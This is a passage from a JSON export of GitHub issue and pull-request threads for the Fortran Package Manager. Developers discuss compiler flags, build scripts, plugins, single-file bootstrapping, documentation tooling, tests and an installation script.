                    "text": "I've added the error check suggested regarding the mutually exclusive options, and done some refactoring to make it easier to add support for more compilers. I'll give everybody a few days to take another look, but I think with some support and approval already, this is ready to merge in."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-11 15:45:49+00:00",
                    "text": "However, we would need additional options to run and test to allow specifying that they run the version(s) built with such a command.\n\ncargo-rustc seems to implement run and test mode inside the rustc subcommand again to keep everything contained.\nAnother option might be to generate a lock file with the used compile flags which is also used for run and test if present, this requires to set the flags only once with build. Once the flags are changed in build the lock file will be updated as well.\nThe file could be something human-readable like TOML:\nfortran-compiler = \"gfortran\"\nfortran-compile-args = [\n  \"-O3\",\n# ...\n]\nMaybe the lock file should be placed in the build directory? One should not be able to check it in into the version control system, I think."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-11 16:27:02+00:00",
                    "text": "I think having the compile (or some other name) subcommand reimplement build, test and run allowing flags would be the most self consistent and easiest to explain. I.e.\nfpm [compile [--flag FLAG]] build|run|test ...\n\nI don't like the idea of a lock file, as it introduces implicit, global state and makes it more complicated to explain. I.e.\n...\nfpm run\n...\nfpm run\n\nWithout knowing what the ...'s are, you don't know if the two invocations of fpm run will do the same thing.\nEither way I think it's something that should be explored in a future PR."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-12 18:09:06+00:00",
                    "text": "Without any other significant comments that I think need addressed here, and some requests from some people funding this effort to make it available, I'm going to go ahead and merge this now."
                }
            ]
        },
        {
            "number": 219,
            "user": "LKedward",
            "date": "2020-10-28 11:09:25+00:00",
            "title": "Support custom build script",
            "text": "Match behaviour of bootstrap version",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-01-19 22:03:21+00:00",
                    "text": "I would prefer to restructure the build-script logic in the package manifest first, see #249, before implementing the logic in Fortran fpm."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-20 15:35:13+00:00",
                    "text": "I could not find any previous discussion pertaining to the bootstrap fpm design of the build-script logic. It seems to be something that @everythingfunctional built in initially to get the project off the ground?\nEdit: I found a former discussion in this issue: #118\nDo any of the libraries used to bootstrap fpm actually require a custom build script? If not, I don't see any reasons why not to restructure the build script logic in the manifest. Since fpm is still in an alpha stage, I don't think this will cause many problems for users."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-01-20 18:02:59+00:00",
                    "text": "I did indeed come up with the initial design primarily on my own. I was trying be compatible with what I believed to be common best practice in Makefiles, but we did discuss some changes that probably ought to be made. Primarily I think we concluded that all \"inputs\" to the build scripts should be through environment variables prefixed with FPM_, and any information the script would like to report back to fpm would be via stdout on lines prefixed with fpm:. This is similar to Cargo's design, and I agree it seems to be working out pretty well for them.\nI'm open to suggestions on how such scripts should be specified and executed in fpm.toml. Mine was just a first draft."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-20 21:14:07+00:00",
                    "text": "Thanks @everythingfunctional for the explanation. I suggest we shift to #249 to figure out a specification."
                }
            ]
        },
        {
            "number": 218,
            "user": "LKedward",
            "date": "2020-10-28 10:36:28+00:00",
            "title": "Add binary releases from latest master using CI",
            "text": "See here for minimal demo which produces these github releases. I will open a cleaned-up PR in coming days.",
            "comments": []
        },
        {
            "number": 217,
            "user": "LKedward",
            "date": "2020-10-28 10:10:08+00:00",
            "title": "Implement static library archiving",
            "text": "In order to match bootstrap version and reduce the size of compiled binaries where possible.",
            "comments": []
        },
        {
            "number": 216,
            "user": "rouson",
            "date": "2020-10-27 19:32:47+00:00",
            "title": "Remove bashism from install.sh",
            "text": "/bin/sh doesn't allow double square brackets so this pull request switches to single brackets",
            "comments": []
        },
        {
            "number": 215,
            "user": "rouson",
            "date": "2020-10-27 19:02:42+00:00",
            "title": "Add --version info",
            "text": "I just installed fpm using the current master branch.  It would be nice to be able to check the fpm version using something like fpm --version and/or fpm -v.  Doing so with my just-installed copy gives\n\u00b1 fpm --version\nInvalid option `--version'\n\nUsage: fpm COMMAND [--release] [--args ARGS]",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:32:36+00:00",
                    "text": "Hi @rouson, it looks like you are referring to the bootstrap version. This functionality is available in the latest Fortran implementation - this is the version that is currently under continued development."
                },
                {
                    "user": "rouson",
                    "date": "2020-11-06 03:10:36+00:00",
                    "text": "@LKedward @everythingfunctional  I'm replacing CMake with fpm in the dag project and would like to update the list of prerequisites in our README.md, where it would be nice to write something like \"fpm version x.y.z or later\".  Even without the fpm --version functionality mentioned in this issue, it would be great to create and tag releases for downstream documentation purposes."
                }
            ]
        },
        {
            "number": 214,
            "user": "awvwgk",
            "date": "2020-10-26 15:35:23+00:00",
            "title": "Dealing with packages using a non-standard layout",
            "text": "fpm currently assumes that the fpm.toml is in the repository root. The most notable example where this is not the case is Fortran fpm itself. Should there be a way to specify the location of the fpm.toml file when fetching a dependency or project?\nThe alternative is to fix this for Fortran fpm and ignore this case for now.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-26 18:34:46+00:00",
                    "text": "I'm not opposed to the idea of letting the fpm.toml file be in a different place (or even have a different name) in theory, but how would a package specify that? The most natural place would be ... in the fpm.toml file, but that doesn't quite work. The other option would be in some sort of metadata with the packages information in the registry. That wouldn't really help \"unpublished\" packages though. I don't think you'd want to require users of your package to specify it in their fpm.toml file, because that's something that would be subject to change and would break your users. Maybe that's not totally unacceptable though, since you'd have to publish a new version to change it anyway. Just some thoughts."
                },
                {
                    "user": "certik",
                    "date": "2020-10-26 20:17:25+00:00",
                    "text": "I think the fpm package should eventually move to having fpm.toml in the root. Alternatively, we can follow \"cargo workspaces\": https://doc.rust-lang.org/book/ch14-03-cargo-workspaces.html"
                }
            ]
        },
        {
            "number": 213,
            "user": "everythingfunctional",
            "date": "2020-10-22 19:01:15+00:00",
            "title": "Bootstrap submodule support",
            "text": "This implements support for submodules in the Haskell (bootstrap) version of fpm. A quick note that this removes any requirements or restrictions on naming conventions for modules and source files. Those could in theory be added back in as explicit checks somewhere.\nAdditionally, this should now work with multiple programs in the same folder. I haven't really tested that yet, but it should work.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-22 21:46:28+00:00",
                    "text": "There are binary files checked into this branch, (several object files, some submodule files and an archive). Those should be removed from the commit history.\n\nNot sure how I missed that. Fixed."
                },
                {
                    "user": "certik",
                    "date": "2020-10-23 16:35:45+00:00",
                    "text": "Great work, thank you.\nWhy were tests moved out of the tests directory directly into top level? I would like to have a tests directory I think.\nIn general, the PR would be a lot easier to review if such unrelated changes were not done in the same PR.\nConsequently, I hope I didn't miss it, it seems there is no test for submodules in the (no removed) tests directory. I think there might be a test for this in the Haskell version, but I think we should strive for providing tests in the tests directory, so that the Fortran version can reuse them."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-23 17:45:14+00:00",
                    "text": "@certik , I moved the examples out of the tests folder, because I thought it strange that they were in the fpm/tests folder, but were still used (and in fact there was a softlink) by the bootstrap version. Also, I find the examples as useful for more than just testing the code; they are examples of how one might organize their own projects to work with fpm, and should thus be much more prominently available (i.e. at the top level). We could put a softlink in the tests folder if you like."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-24 09:32:24+00:00",
                    "text": "The example packages are more useful as demonstrations of the capabilities of fpm to potential and existing users/developers than as actual tests. We need them currently for end-to-end regression testing but their usefulness to identify bugs or general regressions is quite limited."
                },
                {
                    "user": "certik",
                    "date": "2020-10-24 15:02:01+00:00",
                    "text": "It's useful to have examples, no doubt. But more importantly we need tests. I thought these were a good start. How should our testsuite look like?\n\u2026\nOn Sat, Oct 24, 2020, at 3:32 AM, Laurence Kedward wrote:\n\n\n The example packages are more useful as demonstrations of the\n capabilities of fpm to potential and existing users/developers than as\n actual tests. We need them currently for end-to-end regression testing\n but their usefulness to identify bugs or general regressions is quite\n limited.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#213 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVVXOXRFLUUPBWY2DSMKNLJANCNFSM4S3TGKWA>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-26 09:27:12+00:00",
                    "text": "It's useful to have examples, no doubt. But more importantly we need tests. I thought these were a good start. How should our testsuite look like?\n\nYes, I certainly didn't mean to imply that examples are more important than tests. Rather, I want to point out that we already have a fairly comprehensive set of unit tests which give much better code coverage and diagnostic capability than building the example packages (though I agree that we absolutely still need to do this for end-to-end and regression testing).\n\n\nI would like to have a tests directory I think.\n\nThe reason this test directory isn't in the root directory is because fortran fpm is in a sub-directory -  this doesn't need to be the case. Indeed, fpm assumes other fpm packages exist in the top-level directory, why should fpm be any different? We can still keep the bootstrap version separate in a sub-directory."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-26 15:14:56+00:00",
                    "text": "Glad you guys are happy with the new functionality. Is there anything more you would like done in this PR before merging in?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-26 16:39:13+00:00",
                    "text": "+1 to merge from me!"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-26 22:16:36+00:00",
                    "text": "Ok, with 3 approvals I'm going to go ahead and merge. Feel free to create an issue and tag me if you'd like additional changes after."
                }
            ]
        },
        {
            "number": 212,
            "user": "LKedward",
            "date": "2020-10-20 16:47:36+00:00",
            "title": "Implement incremental rebuild",
            "text": "(Rebuild only when source/dependencies modified.)\nI've made a start on this, so creating an issue to assign.",
            "comments": []
        },
        {
            "number": 211,
            "user": "awvwgk",
            "date": "2020-10-20 08:24:28+00:00",
            "title": "Customizing fpm with plugins",
            "text": "For commands like fpm doc or fpm fmt the available pool of tools is quite large and heterogeneous, if we want to support such functionality it must allow some kind of customization\nA non-comprehensive list of tools for fpm doc:\n\ndoxygen\n\nrequires Doxyfile as input\n\n\nford\n\nmarkdown file with yaml header as input, can have any name\n\n\nufpp\n\nactually a preprocessor which can also extract documentation\n\n\n\nFor fpm fmt:\n\nlfortran fmt\n\nactually an LLVM compiler + formatting\n\n\nfindent\n\ncan only take stdin and only writes to stdout\n\n\nfprettify\n\ncan recursively run over the source tree\n\n\n\nAll of those tools come with specific requirements and limitations. Also, I doubt there would be a perfect choice we could all agree on for those functionalities. One possibility is to collect all common tools and add native support for them in fpm, which might be cumbersome and if one has a personal set of tools for this task, they cannot use it with fpm in an automated way.\nMy proposal it to allow defining those functions as \u201cplugins\u201d instead:\n[plugin]\n[plugin.fmt]  # Adds `fmt` command to fpm\nprogram = \"lfortran\"\n# Special variables like @INPUT@ and @OUTPUT@ are replaced by the filenames\ncommand = [\"fmt\", \"--no-color\", \"@INPUT@\"]\n# Standard input and standard output can be captured if necessary \noutput.capture = true\n# Probably needs a better way to define the interaction with the source...\nscope = [\"src/\", \"app/\"]\nThose could be defined locally in a fpm.toml, globally in a .fpmrc.toml or fetched like any other package. Note that installing the actual tool would be in many cases beyond the scope of fpm.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-20 09:44:04+00:00",
                    "text": "I like this idea of plugins to keep things modular but extensible. This will allow the fpm codebase to remain focused and robust. Regarding plugins, it would be good if they could be fetched like other packages to simplify the workflow."
                },
                {
                    "user": "certik",
                    "date": "2020-12-17 19:44:51+00:00",
                    "text": "Copying my text from #313, which I am closing in favor of this issue:\nThis was first mentioned here:\n#309 (reply in thread)\nThe idea is that people are already writing many 3rd party tools for everything from formatting, automatic documentation lookups, pre-processors, etc. Many of these tools require to understand the structure of the project, which fpm knows and can provide to them, so that lfortran fmt can format your whole project, it would get the list of files from fpm.\nIt could go the other way too, so that fman can register a new command fpm man, which would look up things, or lfortran can register fpm fmt. Similar to how git can be extended by simply providing a tool git-something in a $PATH and git something becomes available.\nThe way various Jupyter kernels register with jupyter is that they simply create a file in $PREFIX/share/jupyter/kernels/fortran/kernel.json, which creates a fortran kernel. So in the same way, fman can install a file $PREFIX/share/fpm/plugins/fman/plugin.json which has information where to find fman and anything else needed for fpm to be able to call it. The way this works with Jupyter is that you just install lfortran (say using conda install lfortran) and it will automatically appear in Jupyter as an optional kernel, users do not have to do anything, it just works.\nLet's brainstorm this more."
                }
            ]
        },
        {
            "number": 210,
            "user": "urbanjost",
            "date": "2020-10-18 22:26:06+00:00",
            "title": "suggestion for a --bootstrap option on the fpm build subcommand",
            "text": "Sometimes you want a standalone single source file for an application. A pure Fortran project is particularly amenable  to that. It can be needed for a variety of reasons from optimizing inlining to debugging to bootstrapping on another platform. A simple trick when you have a makefile to build a project is to use a script for compiling and have an option for the compiler to become a simple copy of the source file to stdout (usually after expanding INCLUDE files and preprocessor directives). Since fpm(1) is a source package manager\nit could easily generate a file list at a minimum, and certainly a Makefile if nothing else. Just curious if that sounds worthwhile.  If you do something like that with f-fpm you get a single Fortran file that bootstraps (at least at the moment) except for having to change \"include_\" to \"inc_\" to handle a a known issue. It was nice to be able to try f-fpm even as is on a machine without h-fpm and haskell. Just needed a Fortran compiler and a single file.  So just changing the program to list the filenames instead of compiling them and a few shell commands gave\n# output of files built from a full build\ncat \\\n./src/fpm_environment.f90 \\\n./src/fpm_strings.f90 \\\n./src/fpm_filesystem.f90 \\\n./src/fpm_model.f90 \\\n./src/fpm_backend.f90 \\\n./src/fpm/error.f90 \\\n./src/fpm/git.f90 \\\n./build/dependencies/toml-f/src/tomlf/constants.f90 \\\n./build/dependencies/toml-f/src/tomlf/error.f90 \\\n./build/dependencies/toml-f/src/tomlf/datetime.f90 \\\n./build/dependencies/toml-f/src/tomlf/utils/verify.f90 \\\n./build/dependencies/toml-f/src/tomlf/utils/convert.f90 \\\n./build/dependencies/toml-f/src/tomlf/utils.f90 \\\n./build/dependencies/toml-f/src/tomlf/type/value.f90 \\\n./build/dependencies/toml-f/src/tomlf/structure/base.f90 \\\n./build/dependencies/toml-f/src/tomlf/structure/vector.f90 \\\n./build/dependencies/toml-f/src/tomlf/structure.f90 \\\n./build/dependencies/toml-f/src/tomlf/type/array.f90 \\\n./build/dependencies/toml-f/src/tomlf/type/keyval.f90 \\\n./build/dependencies/toml-f/src/tomlf/type/table.f90 \\\n./build/dependencies/toml-f/src/tomlf/type.f90 \\\n./build/dependencies/toml-f/src/tomlf/build/keyval.f90 \\\n./build/dependencies/toml-f/src/tomlf/build/array.f90 \\\n./build/dependencies/toml-f/src/tomlf/build/table.f90 \\\n./build/dependencies/toml-f/src/tomlf/build.f90 \\\n./build/dependencies/toml-f/src/tomlf/de/tokenizer.f90 \\\n./build/dependencies/toml-f/src/tomlf/de/character.f90 \\\n./build/dependencies/toml-f/src/tomlf/de.f90 \\\n./build/dependencies/toml-f/src/tomlf/ser.f90 \\\n./build/dependencies/toml-f/src/tomlf/version.f90 \\\n./build/dependencies/toml-f/src/tomlf.f90 \\\n./src/fpm/toml.f90 \\\n./src/fpm/manifest/dependency.f90 \\\n./src/fpm/manifest/executable.f90 \\\n./src/fpm_sources.f90 \\\n./build/dependencies/M_CLI2/src/M_CLI2.f90 \\\n./build/dependencies/fortran-intrinsic-manpages/src/M_intrinsics.f90 \\\n./src/fpm_command_line.f90 \\\n./src/fpm/manifest/build_config.f90 \\\n./src/fpm/manifest/library.f90 \\\n./src/fpm/manifest/test.f90 \\\n./src/fpm/versioning.f90 \\\n./src/fpm/manifest/package.f90 \\\n./src/fpm/manifest.f90 \\\n./src/fpm.f90 \\\n./src/fpm/cmd/new.f90 \\\n./build/dependencies/toml-f/src/tomlf/all.f90 \\\n./app/main.f90 \\\n> ffpm.f08\nreplace include_ inc_ -- ffpm.f08\nmkdir /tmp/scratch\ngfortran ffpm.f08 -J /tmp/scratch -o ffpm.exe\nexit\n\nThis was run on a machine that did have h-fpm on it so the dependency files were available and then that single file was moved to a machine with just a fortran compiler and it built and ran; albeit the version I used does not get remote dependencies and so on yet.\nI was thinking even it was not to be a general feature it might be useful for maintaining a bootstrappable fpm(1) command in the future.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-10-18 23:02:34+00:00",
                    "text": "This is roughly related to #69 where it was suggested to have a backend which can emit a makefile.\nIn principle this could carry over directly to bootstrap fpm on a computer platform with restricted access."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-19 15:37:27+00:00",
                    "text": "My initial inclination for producing a \"source code release\" (or bootstrap version) was to put all of the necessary source files and a Makefile into a tarbal, but just combining them all into a single source file is supported by the Fortran language, and could thus be simpler. Not a bad idea. (Note that I think order likely still matters to many compilers.)"
                },
                {
                    "user": "certik",
                    "date": "2020-10-19 15:49:17+00:00",
                    "text": "I think this is almost a duplicate of #123. The only difference is that here everything is put into just one file, while #123 is to create a tarball.\nEither way, I think the answer is yes, we want that."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-10-19 17:19:36+00:00",
                    "text": "My initial inclination for producing a \"source code release\" (or bootstrap version) was to put all of the necessary source files and a Makefile into a tarbal, but just combining them all into a single source file is supported by the Fortran language, and could thus be simpler. Not a bad idea. (Note that I think order likely still matters to many compilers.)\n\nI guess this can only be done for pure Fortran projects without mixed language dependencies. If C code is somehow used, then a tarball is needed."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-20 00:51:55+00:00",
                    "text": "The files were listed in their dependency order not just as a list so I do not know of a compiler that cannot build it with no other requirements -- CMake, make, ... . I have done that for a long time. I think this is similar enough to the others that I will close it. One of the more interesting things about the Fortran features that support a single-file build is that many compilers are much better at optimizing such a file, catching programming errors, and debugging and profiling the program. I have seen large programs reduce their wallclock times by 20% just by being compiled in a single file. There use to be larger gains possible but compilers have gotten better over the years(so it was often already optimizing even though compiled in seperate compilations).  The compiler that produced the least gains when doing this has generally been the Cray compiler which had delayed inlining capabilities. Some compilers used to fail if the file was too large but I have not seen that in some time. With that exception the better the compiler is at optimizing the more gains this produced in the recent past. Have not tried this lately with codes > 300 000, lines but I probably will soon just to see what numbers it produces with a few different compilers. The biggest gains I have seen often involved inlining and I am not sure how well the compilers handle that now that modules are much more common."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-20 09:42:14+00:00",
                    "text": "I believe the current --list option does not list file in a suitable build order, but I can easily incorporate this into the existing backend to do so.\n\nI know of CFD codes where the production code is still compiled in a single compilation unit to maximise inter-procedural optimization. I think nowadays the potential gains are less. Most compilers also now have link-time optimization, which is essentially the same as single unit compilation but with some parsing/processing done beforehand. This is something I want to benchmark at some point, to see the difference between separate compilation, LTO and single-unit compilation. I seem to think that it has a big effect for operator overloading, but I can't find a reference atm. I still perform a single-unit compilation for intensive programs to check that some significant IPO isn't being left out somewhere due to program structure."
                }
            ]
        },
        {
            "number": 209,
            "user": "awvwgk",
            "date": "2020-10-17 11:06:12+00:00",
            "title": "Add automatic documentation for Fortran fpm",
            "text": "create docs.md as input for FORD\nfix docstrings and comment style for FORD\n\nTODO:\n\ndeploy to fortran-lang.org website (separate PR)\nreport bugs to FORD upstream: [[executables]] will always be interpreted as links even in literal code blocks",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-10-17 11:20:25+00:00",
                    "text": "https://github.com/Fortran-FOSS-Programmers/ford seems like the correct upstream for FORD, but the project looks discontinued. If this is the case, we probably have to workaround the bug ourselves or make an attempt to resume the maintenance of FORD."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-04 15:09:39+00:00",
                    "text": "@awvwgk are you able to resolve the conflicts here and perhaps include the new manifest-reference in with the docs. After that I think it's ready to merge."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-04 16:22:54+00:00",
                    "text": "For reference, about the current status of FORD: Fortran-FOSS-Programmers/ford#317.\nUsing FORD for fpm will currently require some ugly fixes since the TOML array of tables will clash with the cross reference syntax. This might be a blocker for this PR until I figure a good way out to work around this issue. The respective bug is described here: Fortran-FOSS-Programmers/ford#309."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-05 09:26:34+00:00",
                    "text": "This might be a blocker for this PR until I figure a good way out to work around this issue.\n\nIs 8030941 a sufficient workaround to merge this?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-05 10:26:24+00:00",
                    "text": "@LKedward Yes, it fixes it by introducing whitespace around the header of the array of tables. It looks ugly in my opinion but is still valid TOML, so if everyone is fine with this solution we can go ahead and merge.\n-[[executable]]\n+[[ executable ]]"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-05 11:06:50+00:00",
                    "text": "Yep, I'm happy with that solution. Having some kind of internal API documentation for developers plus specifications and user documentation on the web is important IMO."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-10 13:14:49+00:00",
                    "text": "I'll go ahead and merge this PR later today."
                }
            ]
        },
        {
            "number": 208,
            "user": "LKedward",
            "date": "2020-10-17 10:58:30+00:00",
            "title": "Minor fixes: to list_files and mkdir in fpm_filesystem",
            "text": "As identified by @urbanjost, there are inconsistencies in the behaviour of our mkdir and list_files filesystem routines on Windows and Linux.\nPR implements the following fixes:\n\nmkdir will not fail if dir already exists;\nlist_files will include hidden files but exclude '.' and '..'",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-10-26 21:13:23+00:00",
                    "text": "Bump. Let's get one more review here before merging."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-10-26 21:21:02+00:00",
                    "text": "Looks fine."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-10-26 21:25:39+00:00",
                    "text": "Thank you! Will merge."
                }
            ]
        },
        {
            "number": 207,
            "user": "urbanjost",
            "date": "2020-10-15 23:01:50+00:00",
            "title": "Errata",
            "text": "Errata in some markdown files",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-16 15:53:16+00:00",
                    "text": "@urbanjost, I'm having trouble running the new_test test on my machine (Ubuntu 18.0, gfortran 7.5.0 & gfortran 10.1.0) - the check for expected filenames is failing (see output below). I've taken a look at the test code and I believe the allocatable character(:) array fnames is causing problems. I would suggest greatly simplifying this check along the lines of:\ncall list_files(trim(directories(i)), file_names,recurse=.true.)\ndo j=1,size(expected)\n  if( .not.(trim(expected(j)).in.file_names) )then\n    tally=[tally,.false.]\n    write(*,'(\"ERROR: FOUND \",*(g0:,\", \"))')( trim(file_names(k)%s), k=1,size(file_names) )\n    write(*,'(*(g0))')'       BUT NO MATCH FOR ',expected(j)\n    cycle TESTS\n  endif\nenddo\n\n>>>DIRECTORY A:   A/app, A/fpm.toml, A/README.md, A/src, A/test, A/app/main.f90, A/src/A.f90, A/test/main.f90\nERROR: EXPECTED A/app, A/fpm.toml, A/README.md, A/src, A/test, A/app/main.f90, A/src/A.f90, A/test/main.f90\n       NO MATCH FOR A/appA/fpmAA/fA                   \n>>>DIRECTORY B:   B/fpm.toml, B/README.md, B/src, B/src/B.f90                             \nERROR: EXPECTED B/fpm.toml, B/README.md, B/src, B/src/B.f90\n       NO MATCH FOR B/fpm.tomlB       \n>>>DIRECTORY C:   C/app, C/fpm.toml, C/README.md, C/app/main.f90\nERROR: EXPECTED C/app, C/fpm.toml, C/README.md, C/app/main.f90\n       NO MATCH FOR C/appC/fpmCC/f                  \n>>>DIRECTORY D:   D/fpm.toml, D/README.md, D/test, D/test/main.f90\nERROR: EXPECTED D/fpm.toml, D/README.md, D/test, D/test/main.f90\n       NO MATCH FOR D/fpm.tomlDD/RE                    \n>>>DIRECTORY E:   E/fpm.toml, E/README.md, E/src, E/test, E/src/E.f90, E/test/main.f90\nERROR: EXPECTED E/fpm.toml, E/README.md, E/src, E/test, E/src/E.f90, E/test/main.f90\n       NO MATCH FOR E/fpm.tomlEE/RE                              \n>>>DIRECTORY F:   F/app, F/fpm.toml, F/README.md, F/src, F/app/main.f90, F/src/F.f90\nERROR: EXPECTED F/app, F/fpm.toml, F/README.md, F/src, F/app/main.f90, F/src/F.f90\n       NO MATCH FOR F/appF/fpmFF/f                                                       \n>>>DIRECTORY G:   corrupted size vs. prev_size"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-16 16:34:04+00:00",
                    "text": "Thanks @urbanjost, the CLI has come together really nicely - the help texts are great and I love the new intrinsics help feature!\nThe changes to fpm new all seem good when tested locally.\nI've done a brief look through and left a few preliminary comments (please also see my comment about new_test).\nPlease sync with master when you get a chance to make it easier to review the unique changes here."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-16 17:52:04+00:00",
                    "text": "OK. I will pull and re-sync.  I suspect I will have a few questions about github in the process. Ultimately, not to throw too big a monkey wrench into the mix I am picturing that once the core f-fpm is fully functional that the fortran documentation, a Fortran formatter, maybe a pre-processor, a translator to make/Cmake and other utilities will be available as something like fpm --addtool NAME and will be separate executables that can be added (and updated) individually. I actually have a little program that evolved out of making a test case for a module to do with ANIS color escape sequences that tries to use the same logic as the txt2man(1) script to colourize the intrinsic documents called \"bully\" (for bulletin)  Just a concept but that is for another day. I know the colour choice is questionable, but a preliminary sample looks like:\n\nThanks for moving this forward."
                }
            ]
        },
        {
            "number": 206,
            "user": "rouson",
            "date": "2020-10-13 18:42:18+00:00",
            "title": "Add installation script in install.sh",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-10-13 19:03:15+00:00",
                    "text": "Thanks @rouson for sending it. I think this only works on Linux?"
                },
                {
                    "user": "rouson",
                    "date": "2020-10-13 19:21:10+00:00",
                    "text": "@certik it was developed on macOS.  The goal will be for it to also work on Linux (I'll test it on Lubuntu) and on the Windows Subsystem for Linux (which I'll eventually test too but I'm not sure of the timeline as I need to purchase Windows).  Also, this first version is skeletal.  Over time, I'll attempt to make it more robust and add features.  For example, I'll add\n\n--help flag\nthe option to specify an install path\nuse of sudo for installation paths that require it\n\nIf you have other requested features, let me know and feel free to submit issues.\nIn theory, I can borrow a lot from the OpenCoarrays installer, but that installer is written in bash 3 because it was the default macOS shell until recently.  Now the default macOS shell is zsh and @everythingfunctional explained to me that the default on Linux is dash, of which I never heard until yesterday.  If possible, I'll go with dash because it's POSIX-compliant, but that depends on how much I'm able to borrow or convert from the OpenCoarrays installer.  It also depends on whether one can expect to find dash preinstalled on most platforms across each of the aforementioned operating systems."
                },
                {
                    "user": "certik",
                    "date": "2020-10-13 20:05:31+00:00",
                    "text": "I am not against having this. I just don't want you to spend too much time if it doesn't end up being used that much. Once the Fortran version of fpm can bootstrap itself, I honestly think the easiest way to distribute it to end users is using:\n\nnative package managers (Conda, spack, apt-get, brew, winget, ...)\nusing a tarball with a cmake build system that only requires a Fortran compiler and cmake (#123).\n\nBut if you think this script makes it easier for you and others, please go ahead. I think we should also be testing this at our CI to ensure it keeps working."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-13 20:30:10+00:00",
                    "text": "In theory, this script should work in any POSIX environment, but I'm not sure how well stack's installer works in all environments. So, it should work on any Linux distro, MacOS, WSL, Cygwin, and probably some others.\nWhat would the CI test for this be? Just run it? I think it's probably sufficient, but there's no way we'll find issues more often than the users for this."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-13 20:41:32+00:00",
                    "text": "I'm not sure if it is necessary to install stack with the haskell-stack installer at all. I would in fact strongly advice against it, because it will mess up with the native package manager.\nA short look on the availability of stack across platforms and distros at https://repology.org/project/haskell:stack/versions shows a surprisingly good coverage. I see at least two ways to install on OSX and one Windows package there. Also stack is readily available on conda-forge for all major platforms: https://github.com/conda-forge/stack-feedstock."
                },
                {
                    "user": "rouson",
                    "date": "2020-10-13 22:04:33+00:00",
                    "text": "@certik to explain the motivation further, I found with OpenCoarrays that\n\nDownloads increased considerably after we added the installer.\nVarious subsets of users have different, non-overlapping installation preferences. A script can capture different approaches with various flags.  For example, @awvwgk prefers installing stack differently.\n\nFor every person who will read documentation and install prerequisites separately, I suspect there are multiple people who will go away silently.  Even just for my own purposes, I like having scripts so I don't have to (re)read the documentation to (re)install."
                },
                {
                    "user": "certik",
                    "date": "2020-10-14 00:22:12+00:00",
                    "text": "Damian, thanks for explaining the motivation further. I am fine putting this in. We want to include all users we can.\n\u2026\nOn Tue, Oct 13, 2020, at 4:04 PM, Damian Rouson wrote:\n\n\n @certik <https://github.com/certik> to explain the motivation further,\n I found with OpenCoarrays that\n\n  1. Downloads increased considerably after we added the installer.\n  2. Various subsets of users have different, non-overlapping\n installation preferences. A script can capture different approaches\n with various flags. For example, @awvwgk <https://github.com/awvwgk>\n prefers installing `stack` differently.\n For every person who will read documentation and install prerequisites\n separately, I suspect there are multiple people who will go away\n silently. Even just for my own purposes, I like having scripts so I\n don't have to (re)read the documentation to (re)install.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#206 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWAJMOAA5GDDJ5IDYADSKTFIDANCNFSM4SPOBZ6A>."
                },
                {
                    "user": "rouson",
                    "date": "2020-10-14 16:55:16+00:00",
                    "text": "@awvwgk I think you're recommending using the system package manager to install stack.  We went with the instructions in the Haskell Stack README.  Also, many system package managers require sudo privileges, which many user lack."
                },
                {
                    "user": "rouson",
                    "date": "2020-10-14 16:59:16+00:00",
                    "text": "@certik let me know if you want CI testing set up before merging this or anything else you require.  I have many thoughts on how to beef this up, but I'm imagining the skeletal version can be merged for now and I can work on making it a more full-featured script later."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-14 17:33:11+00:00",
